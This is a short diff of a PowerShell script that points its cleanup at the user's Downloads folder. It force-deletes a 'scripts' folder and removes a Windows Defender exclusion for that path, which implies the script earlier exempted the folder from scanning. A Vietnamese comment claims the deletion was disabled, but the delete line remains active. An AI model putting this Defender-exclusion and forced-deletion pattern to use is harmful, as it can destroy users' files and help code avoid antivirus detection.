@@ -117,13 +117,13 @@ try {
 $fileStream.Close()
 $fileStream.Dispose()
 
-Set-Location $basePath
+Set-Location C:\Users\$env:USERNAME\Downloads
 
 # ===============================================================================
 # [CHỈNH SỬA] ĐÃ VÔ HIỆU HÓA LỆNH XÓA ĐỂ GIỮ LẠI FILE TRONG CÙNG THƯ MỤC
 # ===============================================================================
 Remove-Item -Recurse -Force scripts
-Remove-MpPreference -ExclusionPath "$basePath" -Force
+Remove-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\Downloads" -Force
 # ===============================================================================
 
 # Caps Lock signal
